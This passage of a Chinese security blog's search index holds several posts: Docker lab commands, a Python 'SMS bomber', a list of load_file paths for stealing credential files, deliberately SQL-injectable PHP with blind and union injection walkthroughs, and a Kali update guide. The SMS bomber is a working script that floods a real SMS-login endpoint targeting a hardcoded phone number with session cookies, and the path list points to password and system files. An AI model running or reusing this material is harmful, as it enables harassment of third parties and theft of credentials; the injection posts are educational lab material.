build</span><br></pre></td></tr></table></figure><h4 id="启动整个环境"><a href="#启动整个环境" class="headerlink" title="启动整个环境"></a>启动整个环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="编译失败解决方法"><a href="#编译失败解决方法" class="headerlink" title="编译失败解决方法"></a>编译失败解决方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jing@ubuntu:/tmp/docker$ sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">jing@ubuntu:/tmp/docker$ sudo su </span><br><span class="line">root@ubuntu:/tmp/docker$ su jing </span><br><span class="line">jing@ubuntu:/tmp/docker$ docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach weblogic</span><br><span class="line"></span><br><span class="line">docker-compose exec weblogic bash</span><br></pre></td></tr></table></figure><h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctrl+p+q</span><br><span class="line">或</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python之短信炸弹</title>
      <link href="/2018/08/12/%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9/"/>
      <url>/2018/08/12/%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="短信接口"><a href="#短信接口" class="headerlink" title="短信接口"></a>短信接口</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-36a04c6cb3c260ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h2 id="python3利用代码"><a href="#python3利用代码" class="headerlink" title="python3利用代码"></a>python3利用代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;    </span><br><span class="line">            &apos;User-Agent&apos;  : &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;,</span><br><span class="line">            &quot;Referer&quot;: &quot;https://zaozao.uc.cn/wm/?wm_st=1.2433b59544c645b8bd35e599999fbc89&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;&apos;_UP_L_&apos;:&apos;zh;&apos;,</span><br><span class="line">            &apos;_UP_F7E_8D_&apos;:&apos;3%2F0Who5ZdC74lxjVJY7DD0PwKLOVbxJPcg0RzQPI6KmBtV6ZMgPh38l93pgubgHDQqhaZ2Sfc0qv%2BRantbfg1mWGAUpRMP4RqXP78Wvu%2FCfvkWWGc5NhCTV71tGOIGgDBR3%2Bu6%2Fjj44DXkBon7E867ln30oYoMozdjkhOclrgipqYAbrjqRo9YuUE9%2Fs5crDh4UEaUwcuagIrOYL%2Bdk%2BidOC3XldiVSc58aiBhq4LS2WW1p4rCuiSyU1VZu4DtwRoAg3J36dS9aj1m9P204NQdNf5Nyo3ldtw6TWtrcg0yJducQVbH%2BT5yM6TQ0ySWQ88mFyMhj2VouQ%2B%2BFKM%2B0tL1ggY93VJqD%2BpMQFMmRjkZcU4AeB7NfZ1w%3D%3D;&apos;,</span><br><span class="line">            &apos;_UP_A4A_11_&apos;:&apos;wb76d1cb59ab4526ae123a7d348152cd;&apos;,</span><br><span class="line">            &apos;_UP_D_&apos; : &apos;pc;&apos;,</span><br><span class="line">            &apos;sm_uuid&apos; : &apos;036beee0eb8ee62c46c6ad2f34274b6f%7C%7C%7C1547268216;&apos;,</span><br><span class="line">            &apos;sm_diu&apos; : &apos;036beee0eb8ee62c46c6ad2f34274b6f%7C%7C11eeeeee4d286169f6%7C1547268216;&apos;,</span><br><span class="line">            &apos;PHPSESSID&apos; : &apos;1877qmq2msnq6cim3l0rojkti1&apos;&#125;            </span><br><span class="line">s=10000000</span><br><span class="line">for _ in range(s):</span><br><span class="line">    r = requests.post(url=&apos;http://zaozao.uc.cn/wm/User/sendSmsCodeForLogin?mobile=15017348578&apos;,cookies=cookie,headers=header)</span><br><span class="line">    #发送post请求</span><br><span class="line">    print(r.text)</span><br><span class="line">    time.sleep(60)</span><br><span class="line">    # 延迟60秒</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>load_file常用路径</title>
      <link href="/2017/07/20/loadfile/"/>
      <url>/2017/07/20/loadfile/</url>
      
        <content type="html"><![CDATA[<h2 id="WINDOWS下"><a href="#WINDOWS下" class="headerlink" title="WINDOWS下:"></a>WINDOWS下:</h2><p>c:/boot.ini //查看系统版本</p><p>c:/windows/php.ini //php配置信息</p><p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p><p>c:/winnt/php.ini</p><p>c:/winnt/my.ini</p><p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p><p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p><p>c:\Program Files\Serv-U\ServUDaemon.ini</p><p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p><p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p><p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p><p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p><p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件    //存储了pcAnywhere的登陆密码</p><p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p><p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p><p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p><p>d:\APACHE\Apache2\conf\httpd.conf</p><p>C:\Program Files\mysql\my.ini</p><p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p><h2 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h2><p>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p><p>/usr/local/apache2/conf/httpd.conf</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p><p>/etc/httpd/conf/httpd.conf // apache配置文件</p><p>/etc/rsyncd.conf //同步程序配置文件</p><p>/etc/my.cnf //mysql的配置文件</p><p>/etc/redhat-release //系统版本</p><p>/etc/issue</p><p>/etc/issue.net</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/sysconfig/iptables 查看防火墙策略</p><p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p><p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p><p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注</title>
      <link href="/2017/06/01/sqlt%E7%9B%B2%E6%B3%A8/"/>
      <url>/2017/06/01/sqlt%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="注入源代码"><a href="#注入源代码" class="headerlink" title="注入源代码"></a>注入源代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">author:txf</span><br><span class="line">*/</span><br><span class="line">header(&apos;content-type: text/html; charset=utf-8&apos;); //设置utf-8编码防止乱码</span><br><span class="line">$id = isset($_GET[&apos;id&apos;]) ? $_GET[&apos;id&apos;] : 1; //id不赋值时默认为id=1</span><br><span class="line">$conn = @mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);  //@符号屏蔽出错</span><br><span class="line">mysql_select_db(&apos;sqltest&apos;,$conn);</span><br><span class="line">$sql = &quot;select * from user where id=$id&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">while($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    echo &apos;盲注&apos;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo &quot;您当前执行的sql语句为：&quot; ;</span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="1-left-判断数据库版本"><a href="#1-left-判断数据库版本" class="headerlink" title="1.left()判断数据库版本"></a>1.left()判断数据库版本</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c185de61ed5cd3c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="错误时"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-686efe61579f5dff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="正确时"><br><strong>可以判断数据库是版本5</strong></p><h3 id="2-判断数据库长度"><a href="#2-判断数据库长度" class="headerlink" title="2.判断数据库长度"></a>2.判断数据库长度</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-fb3ea4757db33def.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="长度为7"></p><h3 id="3-函数解释"><a href="#3-函数解释" class="headerlink" title="3.函数解释"></a>3.函数解释</h3><table><thead><tr><th>函数</th><th style="text-align:center">指令</th><th style="text-align:right">效果 </th></tr></thead><tbody><tr><td>mid()</td><td style="text-align:center">str=”123456” mid(str,2,1)</td><td style="text-align:right">结果为2</td></tr><tr><td>substr()</td><td style="text-align:center">substr(DATABASE(),2,1)</td><td style="text-align:right">查看数据库名第二位 </td></tr><tr><td>left()</td><td style="text-align:center">left(x,y)</td><td style="text-align:right">从x的最左侧开始截取前y位 </td></tr><tr><td>ord()</td><td style="text-align:center">ord(mid(database(),1,1))=114</td><td style="text-align:right">检测database()的第一位ASCII码是否等于114 </td></tr><tr><td>regexp</td><td style="text-align:center">regexp ‘^[a-z]‘</td><td style="text-align:right">正则</td></tr></tbody></table><h3 id="4-sleep-函数判断"><a href="#4-sleep-函数判断" class="headerlink" title="4.sleep()函数判断"></a>4.sleep()函数判断</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-7d18e7dbc37f0c3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="延时5秒"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-8bbf961349af0391.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="不延时"><br><strong>可以判断第一位ascii码为115，也就是字母s</strong>(当前数据库为sqltest)</p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlunion注入</title>
      <link href="/2017/05/01/sqlunion%E6%B3%A8%E5%85%A5/"/>
      <url>/2017/05/01/sqlunion%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="注入源代码"><a href="#注入源代码" class="headerlink" title="注入源代码"></a>注入源代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">author:txf</span><br><span class="line">*/</span><br><span class="line">header(&apos;content-type: text/html; charset=utf-8&apos;); //设置utf-8编码防止乱码</span><br><span class="line">$id = isset($_GET[&apos;id&apos;]) ? $_GET[&apos;id&apos;] : 1; //id不赋值时默认为id=1</span><br><span class="line">$conn = @mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);  //@符号屏蔽出错</span><br><span class="line">mysql_select_db(&apos;sqltest&apos;,$conn); </span><br><span class="line">$sql = &quot;select * from user where id=$id&quot;; </span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">while($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    echo &quot;用户ID：&quot; . $row[&apos;id&apos;] . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &quot;用户名：&quot; . $row[&apos;user&apos;] . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &quot;用户密码：&quot; . $row[&apos;password&apos;] . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($conn);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo &quot;您当前执行的sql语句为：&quot; ;</span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="单引号报错"><a href="#单引号报错" class="headerlink" title="单引号报错"></a>单引号报错</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c033273d6bb03977.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="报错"></p><h3 id="order-by-判断列数"><a href="#order-by-判断列数" class="headerlink" title="order by 判断列数"></a>order by 判断列数</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-bd84f8a264c8dc73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="orderby"></p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-02329fcf4ad1923a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="unionselect"></p><h3 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-9f91d040aaf697f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆数据库"></p><h3 id="爆sqltest数据库的表"><a href="#爆sqltest数据库的表" class="headerlink" title="爆sqltest数据库的表"></a>爆sqltest数据库的表</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-4916d332ac97b1f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆表"></p><h3 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-316eea0f1eae56e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆列"></p><h3 id="爆对应列的字段"><a href="#爆对应列的字段" class="headerlink" title="爆对应列的字段"></a>爆对应列的字段</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-54be7bf190a81550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆字段"></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali2.0快速更新</title>
      <link href="/2016/05/16/kali2.0gengxin/"/>
      <url>/2016/05/16/kali2.0gengxin/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>经常重新安装 kali2.0,记录一下更新过程。</p><h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p>编辑sources.list,将kali更新源加入其中</p><p>sudo vim /etc/apt/sources.list</p><p><strong>国内更新源</strong><br>阿里云</p><blockquote><p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib </p></blockquote><h2 id="更新："><a href="#更新：" class="headerlink" title="更新："></a>更新：</h2><blockquote><p>apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y </p></blockquote><p>命令讲解：<br>apt-get clean    //清除缓存索引<br>apt-get update    //更新索引文件<br>apt-get upgrade    //更新实际的软件包文件<br>apt-get dist-upgrade    //根据依赖关系更新</p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
